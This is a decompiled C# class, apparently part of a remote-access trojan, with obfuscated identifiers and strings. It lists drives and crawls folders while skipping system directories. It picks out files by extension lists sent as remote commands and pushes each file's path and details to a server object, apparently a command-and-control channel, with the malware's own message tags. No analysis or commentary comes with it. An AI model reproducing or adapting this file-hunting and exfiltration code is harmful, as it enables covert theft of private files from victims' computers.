using System;
using System.Collections.Generic;
using System.IO;

namespace emrdhorausi;

internal class emrdhorausiDRIVF
{
	public List<string> emrdhorausinotFilders = new List<string>();

	public string emrdhorausimainPath;

	public int emrdhorausisIndx = 0;

	public List<string> emrdhorausisFiles = new List<string>();

	public string emrdhorausifilesLogs = DAONIF.emrdhorausifilesLogs;

	public int emrdhorausifIndx = 0;

	public bool emrdhorausireaging = false;

	public MREDM iserver;

	public List<string> emrdhorausifExts = new List<string>();

	public emrdhorausiDRIVF()
	{
		emrdhorausinotFilders.Add("msocache|emrdhorausi".Split(new char[1] { '|' })[0]);
		emrdhorausinotFilders.Add("recoveDSDF|emrdhorausi".Split(new char[1] { '|' })[0]);
		emrdhorausinotFilders.Add("documents and settings|emrdhorausi".Split(new char[1] { '|' })[0]);
		emrdhorausinotFilders.Add("program files|emrdhorausi".Split(new char[1] { '|' })[0]);
		emrdhorausinotFilders.Add("system volume information|emrdhorausi".Split(new char[1] { '|' })[0]);
		emrdhorausinotFilders.Add("$recycle.bin|emrdhorausi".Split(new char[1] { '|' })[0]);
		emrdhorausinotFilders.Add("windows|emrdhorausi".Split(new char[1] { '|' })[0]);
		emrdhorausinotFilders.Add("program files (x86)|emrdhorausi".Split(new char[1] { '|' })[0]);
		emrdhorausinotFilders.Add("programdata|emrdhorausi".Split(new char[1] { '|' })[0]);
	}

	public bool emrdhorausiseeAccess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public string emrdhorausilookupDrives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|emrdhorausi".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public IEnumerable<string> emrdhorausiaddFiles(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.emrdhorausiautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (emrdhorausiseeAccess(text) && !emrdhorausinotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void emrdhorausilookFiles(string tempStr)
	{
		iserver.emrdhorausiautCnls = false;
		emrdhorausifExts.Clear();
		emrdhorausisFiles.Clear();
		emrdhorausifIndx = 0;
		emrdhorausisIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				emrdhorausifExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			emrdhorausireaging = true;
			emrdhorausisendSearch(array[1]);
			emrdhorausireaging = false;
			iserver.emrdhorausipush_data(null, "emrdhorausi-seard=searched|emrdhorausi".Split(new char[1] { '|' })[0]);
		}
	}

	public string emrdhorausilookupFiles(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|emrdhorausi".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public string emrdhorausicheckFolders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (emrdhorausiseeAccess(text2))
				{
					text = text + text2 + ">|emrdhorausi".Split(new char[1] { '|' })[0];
				}
			}
		}
		return text;
	}

	public void emrdhorausisendSearch(string path)
	{
		try
		{
			foreach (string item in emrdhorausiaddFiles(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (emrdhorausifExts.Contains(text.ToLower()))
				{
					string text2 = iserver.emrdhorausifile_info(item, ret: true);
					iserver.emrdhorausipush_data(null, "emrdhorausi-searf=|emrdhorausi".Split(new char[1] { '|' })[0] + item + "<FILE_AUTO<|emrdhorausi".Split(new char[1] { '|' })[0] + text2);
				}
				if (iserver.emrdhorausiautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}
}
